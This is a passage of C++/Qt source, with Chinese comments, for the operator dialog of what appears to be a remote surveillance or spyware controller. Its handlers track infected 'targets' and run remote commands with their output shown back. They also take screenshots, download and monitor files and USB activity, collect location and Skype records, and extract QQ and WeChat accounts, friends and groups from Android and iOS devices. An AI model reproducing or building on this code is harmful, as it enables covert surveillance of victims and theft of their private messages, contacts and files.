					progress->setText(QString("%1%").arg(nFinishedProp));

					if ( nDaeIndex )
					{
						QTableWidgetItem* daemonProgress = item->tableWidget()->item(item->row(), nDaeIndex);
						daemonProgress->setText(QString("%1%").arg(nDaemonProp));
					}
				}
			}
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新的目录任务
//
void TargetDlg::on_WM_NEW_DIRTASK(MSG* msg)
{
	DirTask *dirTask = (DirTask *)msg->wParam;

	AddDirTaskToListView(dirTask);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新目录任务状态
//
void TargetDlg::on_WM_UPT_DIRTASK_STATUS(MSG* msg)
{
	DirTask* dirTask = (DirTask *)msg->wParam;

	QTableWidget* table = NULL;

	if (dirTask->dwAutoDown == 0)
	{
		table = ui.tbDirInfoList;
	}
	else
	{
		table = ui.tbDirCommand;
	}

	// 更新界面
	//
	int i = 0;
	QTableWidgetItem* item = NULL;
	for (; i < table->rowCount(); i++)
	{
		item = table->item(i, 0);

		if ( dirTask == (PDirTask)item->data(Qt::UserRole).toUInt() )
		{
			break;
		}
	}

	if (i < table->rowCount())
	{
		if (dirTask->dwAutoDown == 1)
		{
			ui.tbDirCommand->item(i, 4)->setText(QString("%1").arg(dirTask->dwWorkingCount));
			ui.tbDirCommand->item(i, 5)->setText(QString("%1").arg(dirTask->dwPausedCount));
			ui.tbDirCommand->item(i, 6)->setText(QString("%1").arg(dirTask->dwFinishedCount));
			ui.tbDirCommand->item(i, 7)->setText(QString("%1").arg(dirTask->dwCanceledCount));
			ui.tbDirCommand->item(i, 8)->setText(QString("%1").arg(dirTask->dwErroredCount));
		}

		switch(dirTask->taskStatus)
		{
		case WORKING:
			table->item(i, 0)->setText(QString::fromLocal8Bit("进行"));
			break;
		case PAUSED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("暂停"));
			break;
		case ERRORED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("出错"));
			table->item(i, table->columnCount()-1)->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
			break;
		case CANCELED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("取消"));
			break;
		case FINISHED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("完成"));
			break;
		}

		if (dirTask->dwAutoDown == 1)
		{
			int selected = table->selectedItems().count();

			if ( 0 == selected )
			{
				return;
			}

			QTableWidgetItem* selectedItem = table->selectedItems().at(0);
			selectedItem = table->item(selectedItem->row(), 0);

			if ( item == selectedItem )
			{
				QTableWidgetItem* detailItem = NULL;
				PFileTask fileTask = NULL;
				i = 0;
				for (; i < ui.tbFileCommand->rowCount(); i++)
				{
					detailItem = ui.tbFileCommand->item(i, 0);
					fileTask = (PFileTask)detailItem->data(Qt::UserRole).toUInt();

					if (fileTask)
					{
						if (fileTask->taskStatus == WORKING)
						{
							if (dirTask->taskStatus == PAUSED || dirTask->taskStatus == CANCELED)
							{
								fileTask->taskStatus = dirTask->taskStatus;
							}
						}
						else if (fileTask->taskStatus == PAUSED)
						{
							if (dirTask->taskStatus == WORKING || dirTask->taskStatus == CANCELED)
							{
								fileTask->taskStatus = dirTask->taskStatus;
							}
						}

						switch(fileTask->taskStatus)
						{
						case WORKING:
							detailItem->setText(QString::fromLocal8Bit("进行"));
							break;
						case PAUSED:
							detailItem->setText(QString::fromLocal8Bit("暂停"));
							break;
						case ERRORED:
							{
								detailItem->setText(QString::fromLocal8Bit("出错"));
								QString des = QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID));
								ui.tbFileCommand->item(i, 7)->setText(des);
							}
							break;
						case CANCELED:
							detailItem->setText(QString::fromLocal8Bit("取消"));
							break;
						case FINISHED:
							detailItem->setText(QString::fromLocal8Bit("完成"));
							break;
						}
					}
				}
			}
		}
	}

	// 更新任务统计信息
	this->tarBlock->tarConn->Send_DTK(this->tarBlock->dwTargetID, dirTask->dwTaskID, true);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新目录任务统计
//
void TargetDlg::on_WM_UPT_DIRTASK_STATISTIC(MSG* msg)
{
	DirTask *dirTask = (DirTask *)msg->wParam;

	QTableWidget* table;
	if (dirTask->dwAutoDown == 0)
	{
		table = ui.tbDirInfoList;
	}
	else
	{
		table = ui.tbDirCommand;
	}

	// 更新界面
	//
	int i = 0;
	QTableWidgetItem* item = NULL;
	for (; i < table->rowCount(); i++)
	{
		item = table->item(i, 0);

		if (dirTask == (PDirTask)item->data(Qt::UserRole).toUInt())
		{
			break;
		}
	}

	if (i < table->rowCount())
	{
		if (dirTask->dwAutoDown == 1)
		{
			ui.tbDirCommand->item(i, 4)->setText(QString("%1").arg(dirTask->dwWorkingCount));
			ui.tbDirCommand->item(i, 5)->setText(QString("%1").arg(dirTask->dwPausedCount));
			ui.tbDirCommand->item(i, 6)->setText(QString("%1").arg(dirTask->dwFinishedCount));
			ui.tbDirCommand->item(i, 7)->setText(QString("%1").arg(dirTask->dwCanceledCount));
			ui.tbDirCommand->item(i, 8)->setText(QString("%1").arg(dirTask->dwErroredCount));
		}

		switch(dirTask->taskStatus)
		{
		case WORKING:
			table->item(i, 0)->setText(QString::fromLocal8Bit("进行"));
			break;
		case PAUSED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("暂停"));
			break;
		case ERRORED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("出错"));
			table->item(i, table->columnCount()-1)->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
			break;
		case CANCELED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("取消"));
			break;
		case FINISHED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("完成"));
			if ( 0 == dirTask->dwFinishedCount && dirTask->dwAutoDown )
				QMessageBox::information(
				this,
				QString::fromLocal8Bit("提示"),
				QString::fromLocal8Bit("此目录为空目录，不包含任何文件"));
			break;
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新的搜索任务
//
void TargetDlg::on_WM_NEW_SEARCHTASK(MSG* msg)
{
	SearchTask *searchTask = (SearchTask *)msg->wParam;

	AddSearchTaskToListView(searchTask);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新搜索任务状态
//
void TargetDlg::on_WM_UPT_SEARCHTASK_STATUS(MSG* msg)
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private 文件任务结束
//
void TargetDlg::on_WM_FILETASK_FINISHED(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;

	// @@@ 当前对上传并没有处理
	//
	if (fileTask->taskDirect == FILEDOWN)
	{
		if ( bFileControl )
			m_fileCtrlDlg->DownloadFileFinished(fileTask);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新 USB 文件
//
void TargetDlg::on_WM_UPDATE_USB_FILE(MSG* msg)
{
	if (this->bAdvanceFileMonitor == false)
	{
		return;
	}

	m_advanceMonitorDlg->UpdateUsbFile(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新 USB op
//
void TargetDlg::on_WM_UPDATE_USB_OP(MSG* msg)
{
	if (this->bAdvanceFileMonitor == false)
	{
		return;
	}

	m_advanceMonitorDlg->UpdateUsbOp(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新 https
//
void TargetDlg::on_WM_UPDATE_HTTPS(MSG* msg)
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新截屏
//
void TargetDlg::on_WM_UPDATE_SCREEN(MSG* msg)
{
	if ( bScreen )
		m_captureDlg->UpdateScreen(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新磁盘列表
//
void TargetDlg::on_WM_UPDATE_LIRINFO(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->UpdateLirInfo();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新目录列表
//
void TargetDlg::on_WM_UPDATE_DIRINFO(MSG* msg)
{
	wchar_t* lpwidPath = (wchar_t *)msg->wParam;
	this->nDirLastError = (int)msg->lParam;

	if (this->nDirLastError == 0)
	{
		if ( bFileControl )
			m_fileCtrlDlg->UpdateDirInformation(lpwidPath);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新搜索信息
//
void TargetDlg::on_WM_UPDATE_SEARCHINFO(MSG* msg)
{
	//DM->QuerySearchList(tarBlock->dwTargetID, this->tvAdvFileControl, this->tNodeSearchHistory);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 远程执行
//
void TargetDlg::on_WM_REMOTERUN_REDIRECT(MSG* msg)
{
	if ( bCmdConsole )
		m_remoteCmdDlg->RemoteCmdExec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 远程执行输出
//
void TargetDlg::on_WM_REMOTERUN_OUTPUT(MSG* msg)
{
	if ( bCmdConsole )
		m_remoteCmdDlg->RemoteCmdOutput();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 远程执行结束
//
void TargetDlg::on_WM_REMOTERUN_FINISHED(MSG* msg)
{
	if ( bCmdConsole )
		m_remoteCmdDlg->RemoteCmdFinished();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 在线搜索 -> found block
//
void TargetDlg::on_WM_ONLINESEARCH_FOUND_BLOCK(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->SearchStep(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 在线搜索结束
//
void TargetDlg::on_WM_ONLINESEARCH_FINISHED(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->SearchFinished(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 在线搜索错误
//
void TargetDlg::on_WM_ONLINESEARCH_ERRORED(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->SearchFailed(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 截屏结束
//
void TargetDlg::on_WM_CAPFULLSCREEN_FINISHED(MSG* msg)
{
	SetTarStatusInfoExW(STATUS_INFO,
		tarBlock,
		L"[目标%s(ID:%u)] 成功截取全屏一帧!",
		tarBlock->widTargetName.c_str(),
		tarBlock->dwTargetID);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 成功添加文件监视
//
void TargetDlg::on_WM_FILEMONITOR_FINISHED(MSG* msg)
{
	std::wstring path = (LPCWSTR)msg->wParam;
	ULONG add = (ULONG)msg->lParam;
	
	if ( bAdvanceFileMonitor )
		if ( add )
			m_advanceMonitorDlg->AddMonitorItem(path);
		else
			m_advanceMonitorDlg->RemoveMonitorItem(path);

	if ( bFileControl )
		if ( add )
			m_fileCtrlDlg->SetItemMonitorFlag(true);
		else
			m_fileCtrlDlg->SetItemMonitorFlag(false);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 文件状态改变
//
void TargetDlg::on_WM_FILEMONITOR_CHANGED(MSG* msg)
{
	if ( bAdvanceFileMonitor )
		m_advanceMonitorDlg->MonitorFileChanged(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取到新的 location
//
void TargetDlg::on_WM_NEW_LOCATION(MSG* msg)
{
	if ( bMapInfo )
		m_mapInfoDlg->GetNewLocation(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新的 Skype 监控记录
//
void TargetDlg::on_WM_NEW_SKYPE_RECORD(MSG* msg)
{
	if ( bMultimedia )
		m_multimediaDlg->RefreshSkypeData();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新的监控记录
//
void TargetDlg::on_WM_NEW_PLUGIN_DATA(MSG* msg)
{
	if ( bUserAction )
		m_userActionDlg->GetNewPluginData(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新的第三方插件数据
//
void TargetDlg::on_WM_NEW_THIRD_PLUGIN_FILE(MSG* msg)
{
	if ( bThirdPlugin )
		m_thirdPluginDlg->GetNewPluginFile(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 应用取证完毕
//
void TargetDlg::on_WM_APP_INFO_FINISHED(MSG* msg)
{
	if ( bAppInfo )
		m_appInfoDlg->Reload();
}

void TargetDlg::on_WM_APP_QQ_ACCOUNT( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 4);

		std::wstring qqNumber = GetWideFromBase64(args[3]);
		m_appInfoDlg->InsertQQAccount(qqNumber);
	}
}

void TargetDlg::on_WM_APP_QQ_FRIEND( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 9);
		std::wstring owner = GetWideFromBase64(args[3]);
		std::wstring friendNumber = GetWideFromBase64(args[4]);
		std::wstring friendNickName = GetWideFromBase64(args[5]);
		std::wstring remark = GetWideFromBase64(args[6]);
		std::wstring signature = GetWideFromBase64(args[7]);
		std::wstring group = GetWideFromBase64(args[8]);

		m_appInfoDlg->InsertQQFriend(owner, friendNumber, friendNickName, remark, signature, group);
	}
}

void TargetDlg::on_WM_APP_QQ_TROOP( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 7);
		std::wstring owner = GetWideFromBase64(args[3]);
		std::wstring troopNumber = GetWideFromBase64(args[4]);
		std::wstring troopName = GetWideFromBase64(args[5]);
		std::wstring troopMemo = GetWideFromBase64(args[6]);

		m_appInfoDlg->InsertQQTroop(owner, troopNumber, troopName, troopMemo);
	}
}

void TargetDlg::on_WM_APP_WEIXIN_ACCOUNT( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 5);
		std::wstring weixinId = GetWideFromBase64(args[3]);
		std::wstring nickName = GetWideFromBase64(args[4]);

		m_appInfoDlg->InsertWeixinAccount(weixinId, nickName);
	}
}

void TargetDlg::on_WM_APP_WEIXIN_FRIEND( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 6);
		std::wstring weixinId = GetWideFromBase64(args[3]);
		std::wstring friendId = GetWideFromBase64(args[4]);
		std::wstring friendNickName = GetWideFromBase64(args[5]);

		m_appInfoDlg->InsertWeixinFrineds(weixinId, friendId, friendNickName);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @public slot 获取应用数据
//
void TargetDlg::GetAppData()
{
	if ( !FrmMain->ctrOnlineFlag
		|| tarBlock->tarStatus != TARONLINE )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("离线状态下不能获取应用数据!"));
		return;
	}

	if ( SYSTEM_ANDROID == tarBlock->m_sysType )
	{
		if ( bAppInfo )
			m_appInfoDlg->DisableGetData();
		tarBlock->AndroidDownloadAppDataDir();
	}

	if ( SYSTEM_IOS == tarBlock->m_sysType )
	{
		if ( bAppInfo )
			m_appInfoDlg->DisableGetData();
		
		tarBlock->IOSDownloadAppConfig();
	}
}

void TargetDlg::CleanAppData()
{
	DM->CleanAppData(tarBlock->dwTargetID);

	if ( bAppInfo )
		m_appInfoDlg->Reload();
}

void TargetDlg::ExportAppData()
{
	QString path = QFileDialog::getExistingDirectory(this, QString::fromLocal8Bit("选择存放路径"));

	if ( path == "" )
		return;

	path.replace("/", "\\");

	ExportAppInfoDlg dlg(path, tarBlock->dwTargetID);
	dlg.exec();
}

void TargetDlg::UpdateCapturePolicy()
{
	if ( bScreen )
		m_captureDlg->UpdateCapturePolicy();
}

void TargetDlg::ModifyCapturePolicy()
{
	emitModifyCapturePolicy((unsigned int)tarBlock, 4);
}

void TargetDlg::InitTaskList()
{
	// Dir task
	const std::map<ULONG, DirTask*>& dirMap = tarBlock->GetDirTaskMap();
	std::map<ULONG, DirTask*>::const_iterator itd = dirMap.begin();

	while ( itd != dirMap.end() )
	{
		AddDirTaskToListView((*itd).second);
		++itd;
	}

	// File task
	const std::map<ULONG, FileTask*>& fileMap = tarBlock->GetFileTaskMap();

	std::map<ULONG, FileTask*>::const_iterator itf = fileMap.begin();

	while ( itf != fileMap.end() )
	{
		AddFileTaskToListView((*itf).second);
		++itf;
	}
}

void TargetDlg::RefreshOnlineLogInfo()
{
	emit emitRefreshOnlineLogInfo();
}


